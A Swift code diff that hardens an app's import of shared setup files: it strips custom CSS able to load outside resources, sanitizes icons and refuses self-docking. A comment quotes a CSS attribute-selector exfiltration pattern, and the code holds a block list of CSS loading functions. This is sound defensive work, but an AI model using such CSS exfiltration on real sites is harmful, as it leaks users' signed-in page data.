@@ -139,10 +139,33 @@ struct SetupArchive: Codable, Equatable {
             .filter { seen.insert($0).inserted }
     }
 
-    /// Whether any service brings its own CSS, which runs inside that site's
-    /// pages and can change what they show.
+    /// The Mac apps the import would dock, by bundle id. They are left out of
+    /// `hosts`, so they are named on their own.
+    var macApps: [String] {
+        var seen = Set<String>()
+        return listedServiceIndices
+            .compactMap { NativeApp.bundleID(fromServiceURL: services[$0].url) }
+            .filter { seen.insert($0).inserted }
+    }
+
+    /// Whether any service brings CSS that the import will keep, which runs
+    /// inside that site's pages and can change what they show.
     var hasCustomCSS: Bool {
-        listedServiceIndices.contains { !(services[$0].customCSS ?? "").trimmingCharacters(in: .whitespacesAndNewlines).isEmpty }
+        listedServiceIndices.contains { Self.importableCSS(services[$0].customCSS) != nil }
+    }
+
+    /// Imported CSS, or nil when there is none or it could reach outside the
+    /// page. A setup file can come from anyone and can point a service at a site
+    /// the user trusts, so its CSS runs on their signed-in session. CSS that
+    /// loads a resource can send what the page holds elsewhere
+    /// (`input[value^="a"] { background: url(https://…/a) }`), so any CSS that
+    /// loads something is dropped. A backslash goes too: CSS escapes
+    /// (`\75 rl(`) would hide the same calls from the check.
+    static func importableCSS(_ css: String?) -> String? {
+        guard let css, !css.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return nil }
+        let lowered = css.lowercased()
+        let loads = ["url(", "src(", "image(", "image-set(", "cross-fade(", "@import", "\\"]
+        return loads.contains { lowered.contains($0) } ? nil : css
     }
 
     // MARK: - Reading and writing
@@ -178,6 +201,11 @@ struct SetupArchive: Codable, Equatable {
         guard services.count <= Limit.services else { throw ReadError.invalid("too many services") }
         for service in services {
             guard Self.isWebURL(service.url) || NativeApp.bundleID(fromServiceURL: service.url) != nil else { throw ReadError.invalid("a service has an address that isn't a web page") }
+            // Docking Chorus inside itself resizes its own window in a loop and
+            // hides it on every switch. Adding by hand refuses it too.
+            if let bundleID = NativeApp.bundleID(fromServiceURL: service.url), NativeApp.isChorus(bundleID: bundleID) {
+                throw ReadError.invalid("a service is Chorus itself")
+            }
             guard service.label.count <= Limit.textLength, service.url.count <= Limit.textLength,
                   (service.userAgent?.count ?? 0) <= Limit.textLength
             else { throw ReadError.invalid("a service has a name or address longer than Chorus allows") }
@@ -383,12 +411,14 @@ private extension SetupArchive.ServiceRecord {
         )
     }
 
-    /// A new service from the record, with its own id and data store.
+    /// A new service from the record, with its own id and data store. The icon
+    /// is shrunk, and dropped if it isn't a safe image; CSS that could reach
+    /// outside the page is dropped (`SetupArchive.importableCSS`).
     func makeService() -> ServiceInstance {
         ServiceInstance(
             label: label,
             url: url,
-            customIconData: customIconData,
+            customIconData: customIconData.flatMap { IconThumbnail.png(from: $0) },
             catalogEntryID: catalogEntryID,
             isMuted: isMuted,
             showBadge: showBadge,
@@ -396,7 +426,7 @@ private extension SetupArchive.ServiceRecord {
             userAgent: userAgent,
             pageZoom: pageZoom.map { min(max($0, SetupArchive.Limit.zoom.lowerBound), SetupArchive.Limit.zoom.upperBound) },
             osNotificationsEnabled: osNotificationsEnabled,
-            customCSS: customCSS,
+            customCSS: SetupArchive.importableCSS(customCSS),
             darkModeRaw: darkModeRaw,
             openExternalLinksInApp: openExternalLinksInApp,
             stayActiveInBackground: stayActiveInBackground,
